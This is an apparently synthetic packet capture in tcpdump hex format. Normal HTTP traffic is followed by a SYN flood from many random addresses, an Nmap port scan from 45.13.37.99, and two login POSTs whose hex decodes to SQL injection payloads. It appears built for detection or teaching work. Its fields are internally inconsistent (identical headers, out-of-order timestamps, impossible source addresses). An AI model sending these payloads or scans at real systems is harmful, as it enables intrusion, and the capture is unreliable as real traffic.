14:00:00.433349 IP 192.168.10.15.21059 > 192.168.10.50.80: Flags [P.], seq 119398, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:01.228564 IP 192.168.10.15.18689 > 192.168.10.50.80: Flags [P.], seq 999205, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:02.853529 IP 192.168.10.15.54483 > 192.168.10.50.80: Flags [P.], seq 978611, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:03.652988 IP 192.168.10.15.32217 > 192.168.10.50.80: Flags [P.], seq 546007, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:04.987960 IP 192.168.10.15.55176 > 192.168.10.50.80: Flags [P.], seq 390525, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:05.336489 IP 192.168.10.15.27988 > 192.168.10.50.80: Flags [P.], seq 834793, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:06.168555 IP 192.168.10.15.38700 > 192.168.10.50.80: Flags [P.], seq 39093, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:07.585728 IP 192.168.10.15.35665 > 192.168.10.50.80: Flags [P.], seq 612244, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:08.631614 IP 192.168.10.15.37714 > 192.168.10.50.80: Flags [P.], seq 364673, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:09.447673 IP 192.168.10.15.46146 > 192.168.10.50.80: Flags [P.], seq 536508, length 43
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f69 6e64 6578 2e68 746d 6c20 4854 5450
	0x0020:  2f31 2e31 0d0a 486f 7374 3a20 6578 616d
	0x0030:  706c 652e 636f 6d
14:00:10.604691 IP 72.117.43.126.14525 > 192.168.10.50.80: Flags [S], seq 71463, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.962437 IP 82.87.71.205.25008 > 192.168.10.50.80: Flags [S], seq 269435, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.126954 IP 49.177.43.241.22430 > 192.168.10.50.80: Flags [S], seq 478693, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.851853 IP 166.146.149.59.42808 > 192.168.10.50.80: Flags [S], seq 788640, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.914709 IP 165.219.149.84.55378 > 192.168.10.50.80: Flags [S], seq 316693, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.181152 IP 126.93.151.99.16196 > 192.168.10.50.80: Flags [S], seq 64212, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.969562 IP 213.162.100.169.57700 > 192.168.10.50.80: Flags [S], seq 86273, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.974064 IP 52.83.110.13.34859 > 192.168.10.50.80: Flags [S], seq 921377, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.224471 IP 182.115.46.180.46082 > 192.168.10.50.80: Flags [S], seq 666883, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.813685 IP 236.225.54.105.38618 > 192.168.10.50.80: Flags [S], seq 427711, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.355945 IP 229.218.141.105.29064 > 192.168.10.50.80: Flags [S], seq 142953, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.661178 IP 33.75.106.201.46916 > 192.168.10.50.80: Flags [S], seq 215896, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.764796 IP 123.250.10.11.53371 > 192.168.10.50.80: Flags [S], seq 257191, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.302871 IP 250.203.181.8.22647 > 192.168.10.50.80: Flags [S], seq 664124, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.287664 IP 45.172.16.24.47179 > 192.168.10.50.80: Flags [S], seq 214770, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.298348 IP 82.117.65.59.33801 > 192.168.10.50.80: Flags [S], seq 632567, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.183045 IP 241.232.247.222.43078 > 192.168.10.50.80: Flags [S], seq 653083, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.507415 IP 146.34.111.252.16929 > 192.168.10.50.80: Flags [S], seq 435272, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.585028 IP 211.172.153.87.59702 > 192.168.10.50.80: Flags [S], seq 331900, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.623866 IP 176.10.220.61.56715 > 192.168.10.50.80: Flags [S], seq 170474, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.886278 IP 124.156.158.214.33713 > 192.168.10.50.80: Flags [S], seq 269351, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.689129 IP 253.16.152.196.47109 > 192.168.10.50.80: Flags [S], seq 746778, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.180007 IP 24.164.185.8.24372 > 192.168.10.50.80: Flags [S], seq 774530, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.120584 IP 166.234.147.226.17142 > 192.168.10.50.80: Flags [S], seq 410301, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.294142 IP 49.125.142.85.25164 > 192.168.10.50.80: Flags [S], seq 633337, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.437403 IP 36.21.142.125.34414 > 192.168.10.50.80: Flags [S], seq 339661, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.676935 IP 173.138.241.153.12138 > 192.168.10.50.80: Flags [S], seq 155747, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.644757 IP 127.53.11.208.25600 > 192.168.10.50.80: Flags [S], seq 946460, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.653957 IP 171.206.63.233.12191 > 192.168.10.50.80: Flags [S], seq 667967, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.927591 IP 210.133.89.97.39848 > 192.168.10.50.80: Flags [S], seq 717237, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.575881 IP 186.186.174.77.15715 > 192.168.10.50.80: Flags [S], seq 461163, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.519596 IP 8.201.115.135.34026 > 192.168.10.50.80: Flags [S], seq 757015, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.186897 IP 177.124.106.123.29634 > 192.168.10.50.80: Flags [S], seq 407571, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.886679 IP 129.150.176.20.22158 > 192.168.10.50.80: Flags [S], seq 532956, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.563189 IP 32.7.74.244.15230 > 192.168.10.50.80: Flags [S], seq 847866, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.643786 IP 191.240.13.208.25431 > 192.168.10.50.80: Flags [S], seq 505506, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.793559 IP 192.106.224.209.12016 > 192.168.10.50.80: Flags [S], seq 468675, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.507952 IP 165.152.134.246.28359 > 192.168.10.50.80: Flags [S], seq 491986, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.557269 IP 168.160.183.249.21674 > 192.168.10.50.80: Flags [S], seq 200231, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.590142 IP 24.60.47.7.45792 > 192.168.10.50.80: Flags [S], seq 485589, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.434616 IP 229.145.195.203.55376 > 192.168.10.50.80: Flags [S], seq 875283, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.861175 IP 185.7.127.132.17810 > 192.168.10.50.80: Flags [S], seq 773341, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.657161 IP 190.195.207.30.34610 > 192.168.10.50.80: Flags [S], seq 277530, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.335718 IP 183.189.107.193.28945 > 192.168.10.50.80: Flags [S], seq 964554, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.886595 IP 51.88.98.115.10283 > 192.168.10.50.80: Flags [S], seq 90513, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.627242 IP 159.33.208.195.43555 > 192.168.10.50.80: Flags [S], seq 880019, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.959042 IP 103.205.43.7.28588 > 192.168.10.50.80: Flags [S], seq 814477, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.153227 IP 16.140.255.41.53383 > 192.168.10.50.80: Flags [S], seq 99423, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.429257 IP 147.122.178.28.31437 > 192.168.10.50.80: Flags [S], seq 767753, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.781255 IP 135.184.131.122.16859 > 192.168.10.50.80: Flags [S], seq 208273, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.668924 IP 141.169.107.52.50171 > 192.168.10.50.80: Flags [S], seq 882079, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.165914 IP 157.115.224.191.18940 > 192.168.10.50.80: Flags [S], seq 422692, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.734373 IP 205.148.239.225.29889 > 192.168.10.50.80: Flags [S], seq 12100, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.933469 IP 93.159.113.34.33022 > 192.168.10.50.80: Flags [S], seq 391968, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.841891 IP 233.6.91.7.35008 > 192.168.10.50.80: Flags [S], seq 23107, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.788133 IP 104.94.210.253.57247 > 192.168.10.50.80: Flags [S], seq 126764, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.517019 IP 178.245.212.192.23497 > 192.168.10.50.80: Flags [S], seq 422491, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.715165 IP 169.141.146.4.22295 > 192.168.10.50.80: Flags [S], seq 422822, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.542903 IP 244.220.243.65.32981 > 192.168.10.50.80: Flags [S], seq 203061, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.851652 IP 104.144.105.202.27286 > 192.168.10.50.80: Flags [S], seq 486940, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.572820 IP 61.72.61.252.24324 > 192.168.10.50.80: Flags [S], seq 276288, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.485291 IP 181.43.250.137.17702 > 192.168.10.50.80: Flags [S], seq 953093, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.338435 IP 54.80.246.197.59353 > 192.168.10.50.80: Flags [S], seq 693321, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.104495 IP 24.178.220.75.20065 > 192.168.10.50.80: Flags [S], seq 650375, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.796913 IP 152.221.29.226.17663 > 192.168.10.50.80: Flags [S], seq 425121, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.793520 IP 86.33.53.222.10293 > 192.168.10.50.80: Flags [S], seq 232675, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.984108 IP 10.152.135.92.18807 > 192.168.10.50.80: Flags [S], seq 353935, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.328784 IP 80.253.214.253.10885 > 192.168.10.50.80: Flags [S], seq 426983, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.162586 IP 116.237.76.139.47853 > 192.168.10.50.80: Flags [S], seq 762508, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.434565 IP 166.214.216.83.25801 > 192.168.10.50.80: Flags [S], seq 398211, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.511490 IP 163.225.192.95.15783 > 192.168.10.50.80: Flags [S], seq 978290, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.368947 IP 126.79.12.213.52433 > 192.168.10.50.80: Flags [S], seq 142910, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.801981 IP 151.51.124.14.13986 > 192.168.10.50.80: Flags [S], seq 947639, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.707979 IP 19.169.172.46.11526 > 192.168.10.50.80: Flags [S], seq 63984, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.348399 IP 19.110.150.205.10674 > 192.168.10.50.80: Flags [S], seq 924507, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.287754 IP 166.20.178.90.15965 > 192.168.10.50.80: Flags [S], seq 870961, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.480508 IP 254.224.201.206.29751 > 192.168.10.50.80: Flags [S], seq 508895, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.588048 IP 35.172.137.186.42707 > 192.168.10.50.80: Flags [S], seq 605407, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.599307 IP 182.250.129.187.50437 > 192.168.10.50.80: Flags [S], seq 766196, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.967096 IP 54.93.86.22.17303 > 192.168.10.50.80: Flags [S], seq 465110, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.364692 IP 200.125.113.248.31858 > 192.168.10.50.80: Flags [S], seq 164135, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.520423 IP 182.91.32.8.32821 > 192.168.10.50.80: Flags [S], seq 29820, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.944727 IP 120.145.235.127.24883 > 192.168.10.50.80: Flags [S], seq 827533, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.439025 IP 184.237.91.194.45192 > 192.168.10.50.80: Flags [S], seq 746688, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.624482 IP 140.17.237.250.42761 > 192.168.10.50.80: Flags [S], seq 990026, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.318858 IP 52.227.46.176.15448 > 192.168.10.50.80: Flags [S], seq 961325, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.239600 IP 226.153.203.58.26039 > 192.168.10.50.80: Flags [S], seq 360926, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.139225 IP 1.164.209.235.33518 > 192.168.10.50.80: Flags [S], seq 996792, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.693524 IP 57.111.149.200.56990 > 192.168.10.50.80: Flags [S], seq 762701, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.252973 IP 234.123.242.92.18301 > 192.168.10.50.80: Flags [S], seq 360000, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.136606 IP 64.175.183.107.40938 > 192.168.10.50.80: Flags [S], seq 721532, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.483155 IP 149.223.191.184.12494 > 192.168.10.50.80: Flags [S], seq 293002, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.471798 IP 4.185.33.199.53338 > 192.168.10.50.80: Flags [S], seq 747247, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.287965 IP 201.175.181.242.59161 > 192.168.10.50.80: Flags [S], seq 103333, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.877036 IP 219.93.37.14.11694 > 192.168.10.50.80: Flags [S], seq 943739, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.409302 IP 191.30.119.26.11740 > 192.168.10.50.80: Flags [S], seq 988934, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.423027 IP 229.44.124.164.32859 > 192.168.10.50.80: Flags [S], seq 609429, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.808505 IP 33.157.156.203.36655 > 192.168.10.50.80: Flags [S], seq 518849, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.111753 IP 158.136.68.19.25274 > 192.168.10.50.80: Flags [S], seq 330468, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.250159 IP 32.141.90.19.15778 > 192.168.10.50.80: Flags [S], seq 410867, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.414564 IP 19.118.236.56.38151 > 192.168.10.50.80: Flags [S], seq 892456, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.872403 IP 80.135.242.52.12722 > 192.168.10.50.80: Flags [S], seq 158104, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.107650 IP 201.97.119.231.56239 > 192.168.10.50.80: Flags [S], seq 473339, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.366158 IP 21.88.113.36.46428 > 192.168.10.50.80: Flags [S], seq 645283, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.608662 IP 192.1.224.41.11535 > 192.168.10.50.80: Flags [S], seq 829505, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.481850 IP 241.153.206.184.50261 > 192.168.10.50.80: Flags [S], seq 807109, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.621270 IP 1.175.67.249.24573 > 192.168.10.50.80: Flags [S], seq 592991, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.209942 IP 218.174.78.216.11984 > 192.168.10.50.80: Flags [S], seq 156391, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.879800 IP 45.124.40.106.50350 > 192.168.10.50.80: Flags [S], seq 91991, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.950412 IP 134.80.213.251.23845 > 192.168.10.50.80: Flags [S], seq 320094, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.141403 IP 126.122.190.157.31731 > 192.168.10.50.80: Flags [S], seq 894120, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.451708 IP 97.129.63.184.56447 > 192.168.10.50.80: Flags [S], seq 219146, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.877488 IP 251.113.158.102.28642 > 192.168.10.50.80: Flags [S], seq 741128, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.381381 IP 35.144.162.207.28298 > 192.168.10.50.80: Flags [S], seq 43568, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.532232 IP 129.91.103.211.18065 > 192.168.10.50.80: Flags [S], seq 860731, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.144433 IP 46.46.188.249.46228 > 192.168.10.50.80: Flags [S], seq 350751, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.878247 IP 113.53.149.109.13770 > 192.168.10.50.80: Flags [S], seq 911174, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.390489 IP 178.171.136.12.14986 > 192.168.10.50.80: Flags [S], seq 971144, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.705264 IP 166.36.125.144.49092 > 192.168.10.50.80: Flags [S], seq 13875, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.274388 IP 250.185.198.247.50673 > 192.168.10.50.80: Flags [S], seq 574349, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.768683 IP 22.169.166.17.30278 > 192.168.10.50.80: Flags [S], seq 687231, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.918481 IP 72.141.36.1.48781 > 192.168.10.50.80: Flags [S], seq 859598, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.703266 IP 136.132.60.101.56327 > 192.168.10.50.80: Flags [S], seq 108100, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.521961 IP 104.171.48.180.33223 > 192.168.10.50.80: Flags [S], seq 531636, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.765411 IP 224.214.233.209.42717 > 192.168.10.50.80: Flags [S], seq 582221, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.348757 IP 250.46.198.54.52897 > 192.168.10.50.80: Flags [S], seq 108933, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.640847 IP 175.186.56.219.23756 > 192.168.10.50.80: Flags [S], seq 946111, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.955551 IP 13.23.163.232.57550 > 192.168.10.50.80: Flags [S], seq 10141, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.862674 IP 154.136.59.212.30419 > 192.168.10.50.80: Flags [S], seq 473910, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.761302 IP 180.139.51.58.45769 > 192.168.10.50.80: Flags [S], seq 297267, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.360729 IP 177.32.11.87.50027 > 192.168.10.50.80: Flags [S], seq 972202, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.111602 IP 56.63.62.160.50420 > 192.168.10.50.80: Flags [S], seq 609388, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.702413 IP 68.20.23.65.54898 > 192.168.10.50.80: Flags [S], seq 287760, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.674828 IP 192.20.64.208.59537 > 192.168.10.50.80: Flags [S], seq 538983, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.224932 IP 39.237.93.20.39082 > 192.168.10.50.80: Flags [S], seq 51529, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.592765 IP 6.137.252.249.35331 > 192.168.10.50.80: Flags [S], seq 271587, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.138803 IP 216.247.54.95.48017 > 192.168.10.50.80: Flags [S], seq 911756, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.920717 IP 131.132.213.38.10243 > 192.168.10.50.80: Flags [S], seq 222550, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.487477 IP 176.75.186.240.45582 > 192.168.10.50.80: Flags [S], seq 40545, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.790759 IP 75.207.141.245.35451 > 192.168.10.50.80: Flags [S], seq 546614, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.453078 IP 218.56.235.73.34855 > 192.168.10.50.80: Flags [S], seq 294945, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.351183 IP 233.165.3.167.52960 > 192.168.10.50.80: Flags [S], seq 395691, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.246182 IP 202.109.57.94.45890 > 192.168.10.50.80: Flags [S], seq 958998, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.137214 IP 85.194.127.39.16411 > 192.168.10.50.80: Flags [S], seq 600801, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.712191 IP 126.68.204.71.57145 > 192.168.10.50.80: Flags [S], seq 657058, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.155061 IP 85.16.200.179.27302 > 192.168.10.50.80: Flags [S], seq 460282, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.399001 IP 25.46.159.115.56280 > 192.168.10.50.80: Flags [S], seq 570498, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.233862 IP 168.150.129.157.39099 > 192.168.10.50.80: Flags [S], seq 203197, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.119926 IP 254.41.63.96.48939 > 192.168.10.50.80: Flags [S], seq 528164, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:10.270894 IP 79.119.72.197.22371 > 192.168.10.50.80: Flags [S], seq 374334, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.113796 IP 45.13.37.99.25915 > 192.168.10.50.21: Flags [S], seq 715897, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.450063 IP 45.13.37.99.21043 > 192.168.10.50.22: Flags [S], seq 354043, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.156114 IP 45.13.37.99.32453 > 192.168.10.50.23: Flags [S], seq 198336, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.908417 IP 45.13.37.99.39376 > 192.168.10.50.25: Flags [S], seq 210378, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.747851 IP 45.13.37.99.57819 > 192.168.10.50.53: Flags [S], seq 464372, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.745265 IP 45.13.37.99.50654 > 192.168.10.50.80: Flags [S], seq 521844, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.454996 IP 45.13.37.99.13809 > 192.168.10.50.80: Flags [P.], seq 20712, length 49
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f20 4854 5450 2f31 2e31 0d0a 5573 6572
	0x0020:  2d41 6765 6e74 3a20 4e6d 6170 2053 6372
	0x0030:  6970 7469 6e67 2045 6e67 696e 65
14:00:20.942000 IP 45.13.37.99.56426 > 192.168.10.50.110: Flags [S], seq 16095, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.709165 IP 45.13.37.99.19278 > 192.168.10.50.143: Flags [S], seq 668517, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.872109 IP 45.13.37.99.10017 > 192.168.10.50.443: Flags [S], seq 433336, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.790396 IP 45.13.37.99.45572 > 192.168.10.50.3306: Flags [S], seq 462984, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:20.526409 IP 45.13.37.99.37828 > 192.168.10.50.8080: Flags [S], seq 62580, length 0
	0x0000:  4500 003c 1a2b 0000 4006 0000
14:00:30.987813 IP 45.13.37.99.25317 > 192.168.10.50.80: Flags [P.], seq 886172, length 56
	0x0000:  4500 003c 1a2b 0000 4006 0000 504f 5354
	0x0010:  202f 6c6f 6769 6e2e 7068 7020 4854 5450
	0x0020:  2f31 2e31 0d0a 436f 6e74 656e 743a 2075
	0x0030:  7365 723d 6164 6d69 6e27 204f 5220 2731
	0x0040:  273d 2731
14:00:30.732743 IP 45.13.37.99.49237 > 192.168.10.50.80: Flags [P.], seq 925385, length 92
	0x0000:  4500 003c 1a2b 0000 4006 0000 504f 5354
	0x0010:  202f 6c6f 6769 6e2e 7068 7020 4854 5450
	0x0020:  2f31 2e31 0d0a 436f 6e74 656e 743a 2053
	0x0030:  454c 4543 5420 2a20 4652 4f4d 2075 7365
	0x0040:  7273 2057 4845 5245 2069 643d 3120 554e
	0x0050:  494f 4e20 5345 4c45 4354 2031 2c76 6572
	0x0060:  7369 6f6e 2829 2c33
